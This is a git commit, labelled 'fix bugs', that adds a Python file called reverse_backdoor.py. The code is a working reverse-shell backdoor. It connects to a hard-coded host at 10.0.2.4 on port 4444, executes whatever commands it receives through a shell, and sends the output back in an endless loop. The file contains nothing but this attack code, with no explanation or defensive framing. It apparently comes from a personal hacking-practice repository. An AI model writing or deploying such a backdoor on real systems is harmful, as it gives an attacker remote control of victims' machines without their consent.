21e0505078804c29720ba55c47df226ae08d76ba
developerkhashab <mohammad.khashab.mk@gmail.com>
2020-10-06 12:51:20 -0400

    fix bugs

--- Reverse_Backdoor/reverse_backdoor.py
+++ Reverse_Backdoor/reverse_backdoor.py
@@ -1,1 +1,24 @@
 #!usr/bin/env python3
+
+import socket
+import subprocess
+
+
+class Backdoor:
+    def __init__(self, ip, port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+
+    def execute_system_command(self,command):
+        return subprocess.check_output(command, shell=True)
+
+    def run(self):
+        while True:
+            command = self.connection.recv(2048).decode()
+            command_result = self.execute_system_command(command)
+            self.connection.send(command_result)
+        self.connection.close()
+
+
+my_backdoor = Backdoor("10.0.2.4", 4444)
+my_backdoor.run()
